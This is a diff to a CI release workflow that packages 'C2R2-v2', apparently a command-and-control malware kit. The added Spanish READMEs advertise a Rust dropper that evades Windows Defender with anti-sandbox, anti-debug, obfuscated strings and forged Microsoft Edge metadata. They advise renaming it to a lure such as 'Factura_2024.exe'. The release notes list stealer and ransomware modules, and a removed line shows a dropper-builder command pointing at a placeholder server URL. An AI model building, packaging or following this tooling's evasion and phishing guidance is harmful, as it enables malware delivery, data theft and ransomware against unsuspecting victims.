@@ -230,9 +230,39 @@ jobs:
           mkdir -p release/C2R2-v2/team-client
           cp artifacts/team-client-windows/c2r2_team_client.exe release/C2R2-v2/team-client/
           
-          # === Dropper ===
+          # === Dropper (Rust binary + Python scripts) ===
           mkdir -p release/C2R2-v2/dropper
-          cp -r artifacts/dropper-package/* release/C2R2-v2/dropper/
+          # Rust dropper binary
+          cp artifacts/rust-binaries/dropper.exe release/C2R2-v2/dropper/dropper.exe 2>/dev/null || true
+          # Python dropper scripts (legacy)
+          cp -r artifacts/dropper-package/* release/C2R2-v2/dropper/scripts/ 2>/dev/null || mkdir -p release/C2R2-v2/dropper/scripts && cp -r artifacts/dropper-package/* release/C2R2-v2/dropper/scripts/
+          
+          # Create dropper README
+          cat > release/C2R2-v2/dropper/README.md << 'DROPPER_EOF'
+          # C2R2 Dropper
+          
+          ## Dropper Rust (Recomendado)
+          
+          El `dropper.exe` es un dropper compilado en Rust que evade Windows Defender.
+          
+          ### Características
+          - Anti-sandbox (detecta VMs, bajo RAM, pocos CPUs)
+          - Anti-debug (detecta depuradores)
+          - Strings ofuscados en tiempo de compilación
+          - Metadata legítimo (simula Microsoft Edge)
+          - Ejecución sin ventanas
+          
+          ### Uso
+          1. Editar `dropper-rust/src/config.rs` con tu configuración
+          2. Recompilar el dropper
+          3. Renombrar a algo convincente (ej: `Factura_2024.exe`)
+          
+          ## Scripts Python (Legacy)
+          
+          En `scripts/` hay droppers basados en Python. Estos tienen mayor
+          tasa de detección que el dropper Rust.
+          
+          DROPPER_EOF
           
           # === Documentation ===
           cat > release/C2R2-v2/README.md << 'EOF'
@@ -291,12 +321,18 @@ jobs:
           Conectar via SSH tunnel al servidor
           ```
           
-          ### 4. Dropper
-          ```bash
-          cd dropper
-          pip install -r requirements.txt
-          python builder.py --agent ../agent/agent.exe --output payload.bat --type bat --url http://TU_SERVIDOR/agent.exe
-          ```
+          ### 4. Dropper (Evasión de Windows Defender)
+          
+          El dropper Rust (`dropper/dropper.exe`) está diseñado para evadir antivirus:
+          - Anti-sandbox (detecta VMs, bajo RAM, pocos CPUs)
+          - Anti-debug (detecta depuradores)
+          - Strings ofuscados en tiempo de compilación
+          - Metadata legítimo (simula Microsoft Edge)
+          
+          Para personalizar el dropper:
+          1. Editar `dropper-rust/src/config.rs` con la URL de tu servidor
+          2. Recompilar
+          3. Renombrar a algo convincente (`Factura_2024.exe`)
           
           ## ⚠️ Advertencia Legal
           
@@ -343,11 +379,18 @@ jobs:
             
             ### Contenido
             - ✅ Servidor C2 (Linux x86_64 y ARM64)
-            - ✅ Agente Windows
+            - ✅ Agente Windows (.exe)
             - ✅ Builder (Linux y Windows)
             - ✅ Team Client GUI (Windows .exe)
             - ✅ Módulos encriptados (stealer, ransomware)
-            - ✅ Dropper builder (Python)
+            - ✅ **Dropper Rust** (evade Windows Defender)
+            
+            ### Dropper Rust
+            El nuevo dropper compilado en Rust incluye:
+            - 🛡️ Anti-sandbox (detecta VMs, bajo RAM, pocos CPUs)
+            - 🔒 Anti-debug
+            - 🔐 Strings ofuscados
+            - 📋 Metadata de Microsoft Edge
             
             ### Uso
             Descargar `C2R2-v2-${{ steps.version.outputs.version }}.zip` y consultar README.md incluido.
